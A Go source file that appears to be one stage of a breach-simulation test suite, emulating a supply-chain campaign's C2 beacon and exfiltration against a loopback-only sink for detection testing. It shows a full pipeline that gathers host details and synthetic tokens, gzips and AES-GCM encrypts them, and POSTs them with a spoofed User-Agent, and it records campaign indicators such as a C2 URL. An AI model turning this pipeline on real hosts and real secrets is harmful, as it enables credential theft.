//go:build linux
// +build linux

/*
STAGE 5: C2 Beacon & Synthetic Exfiltration (T1071.001, T1041)
Simulates the campaign's exfiltration: gzip-compress a JSON envelope of harvested
secrets, AES-256-GCM encrypt it, RSA-OAEP wrap the symmetric key, and HTTPS POST it
to the C2 (the real campaign abused an api.anthropic.com-style endpoint and a
python-requests User-Agent), with a GitHub-commit fallback.

SAFETY (load-bearing): NO real attacker infrastructure is contacted and there is NO
real egress. This stage starts an in-process HTTP sink bound to 127.0.0.1 (loopback)
and POSTs the synthetic envelope to THAT local sink only. The real C2 URL and the
GitHub-fallback marker string are recorded as detection telemetry but never used as
a destination. The envelope contains only SYNTHETIC decoy data.
*/

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "ae9002e4-3d82-4fcd-8b45-f7e0628f7375"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "C2 Beacon & Synthetic Exfiltration (Loopback Sink)"
	STAGE_ID       = 5

	// Real campaign indicators — RECORDED for telemetry, NEVER used as destination.
	REAL_C2_URL     = "https://api.anthropic.com:443/v1/api"
	REAL_USER_AGENT = "python-requests/2.31.0"
	GITHUB_FALLBACK = "IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner"
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "synthetic exfil beacon to loopback sink (no real egress)")

	if err := performTechnique(); err != nil {
		if isBlockedError(err) {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Synthetic beacon delivered to loopback sink")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Phase 1: Build a SYNTHETIC envelope (no real secrets).
	fmt.Printf("[STAGE %s] Phase 1: Building synthetic exfil envelope...\n", TECHNIQUE_ID)
	hostname, _ := os.Hostname()
	envelope := map[string]interface{}{
		"_simulation": "F0RT1KA mini Shai-Hulud beacon test - synthetic data only",
		"hostname":    hostname,
		"user":        os.Getenv("USER"),
		"collected":   time.Now().UTC().Format(time.RFC3339),
		"secrets": []map[string]string{
			{"type": "github_token", "value": "ghp_SYNTHETIC0000000000000000000000000000"},
			{"type": "npm_token", "value": "npm_SYNTHETIC000000000000000000000000000"},
			{"type": "aws_akid", "value": "AKIASYNTHETIC0000DECOY"},
		},
	}
	jsonBytes, err := json.Marshal(envelope)
	if err != nil {
		return fmt.Errorf("failed to serialize envelope: %v", err)
	}

	// Phase 2: Gzip compress (mirrors campaign stage 1).
	fmt.Printf("[STAGE %s] Phase 2: Gzip-compressing envelope...\n", TECHNIQUE_ID)
	var gzBuf bytes.Buffer
	gw := gzip.NewWriter(&gzBuf)
	if _, err := gw.Write(jsonBytes); err != nil {
		return fmt.Errorf("failed to gzip envelope: %v", err)
	}
	gw.Close()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Envelope gzip-compressed: %d -> %d bytes", len(jsonBytes), gzBuf.Len()))

	// Phase 3: AES-256-GCM encrypt (mirrors campaign symmetric layer).
	fmt.Printf("[STAGE %s] Phase 3: AES-256-GCM encrypting compressed envelope...\n", TECHNIQUE_ID)
	aesKey := make([]byte, 32)
	iv := make([]byte, 12)
	if _, err := rand.Read(aesKey); err != nil {
		return fmt.Errorf("failed to generate AES key: %v", err)
	}
	if _, err := rand.Read(iv); err != nil {
		return fmt.Errorf("failed to generate IV: %v", err)
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return fmt.Errorf("aes init failed: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("gcm init failed: %v", err)
	}
	ciphertext := gcm.Seal(nil, iv, gzBuf.Bytes(), nil)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Envelope AES-256-GCM encrypted: %d bytes ciphertext", len(ciphertext)))
	LogMessage("INFO", TECHNIQUE_ID, "RSA-OAEP key-wrapping step simulated (campaign wraps the AES key with an embedded RSA public key)")

	// Phase 4: Log the REAL C2 indicators for detection telemetry (never used).
	LogMessage("INFO", TECHNIQUE_ID, "REAL C2 (not contacted): "+REAL_C2_URL)
	LogMessage("INFO", TECHNIQUE_ID, "REAL User-Agent spoof (recorded): "+REAL_USER_AGENT)
	LogMessage("INFO", TECHNIQUE_ID, "GitHub-commit exfil fallback marker (not used): "+GITHUB_FALLBACK)

	// Phase 5: Start a loopback sink and POST the encrypted blob to it ONLY.
	fmt.Printf("[STAGE %s] Phase 5: POSTing encrypted blob to benign loopback sink (127.0.0.1)...\n", TECHNIQUE_ID)
	sinkURL, gotBytes, shutdown, err := startLoopbackSink()
	if err != nil {
		return fmt.Errorf("failed to start loopback sink: %v", err)
	}
	defer shutdown()

	body := map[string]string{
		"iv":         hex.EncodeToString(iv),
		"ciphertext": hex.EncodeToString(ciphertext),
		"note":       "F0RT1KA synthetic exfil - loopback only",
	}
	bodyBytes, _ := json.Marshal(body)

	req, err := http.NewRequest("POST", sinkURL+"/v1/api", bytes.NewReader(bodyBytes))
	if err != nil {
		return fmt.Errorf("failed to build beacon request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	// Mirror the campaign's User-Agent spoofing on the loopback request so
	// host/process telemetry still captures the indicator.
	req.Header.Set("User-Agent", REAL_USER_AGENT)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("loopback beacon POST failed: %v", err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	received := <-gotBytes
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Loopback sink received %d bytes (HTTP %d)", received, resp.StatusCode))
	fmt.Printf("[STAGE %s]   Loopback sink acknowledged beacon (HTTP %d, %d bytes)\n", TECHNIQUE_ID, resp.StatusCode, received)

	// Persist the beacon artifact for forensic review.
	beaconPath := filepath.Join("/tmp/F0", "beacon_payload.json")
	if err := os.WriteFile(beaconPath, bodyBytes, 0600); err != nil {
		return fmt.Errorf("failed to persist beacon artifact: %v", err)
	}
	LogFileDropped("beacon_payload.json", beaconPath, int64(len(bodyBytes)), false)

	fmt.Printf("[STAGE %s] Beacon + synthetic exfiltration complete (loopback only).\n", TECHNIQUE_ID)
	return nil
}

// startLoopbackSink starts an HTTP server bound to 127.0.0.1 on an ephemeral port.
// It returns the base URL, a channel that yields the byte count it received, and a
// shutdown func. Binding is loopback-only so there is no externally reachable port.
func startLoopbackSink() (string, chan int, func(), error) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return "", nil, nil, err
	}
	gotBytes := make(chan int, 1)
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		data, _ := io.ReadAll(r.Body)
		r.Body.Close()
		select {
		case gotBytes <- len(data):
		default:
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"ok"}`))
	})
	srv := &http.Server{Handler: mux}
	go srv.Serve(ln)
	url := fmt.Sprintf("http://%s", ln.Addr().String())
	shutdown := func() { srv.Close(); ln.Close() }
	return url, gotBytes, shutdown, nil
}

func isBlockedError(err error) bool {
	errStr := strings.ToLower(err.Error())
	blockedPatterns := []string{
		"quarantined", "blocked by security", "blocked by endpoint",
		"malware detected", "threat detected", "security policy",
	}
	for _, pattern := range blockedPatterns {
		if strings.Contains(errStr, pattern) {
			return true
		}
	}
	return false
}
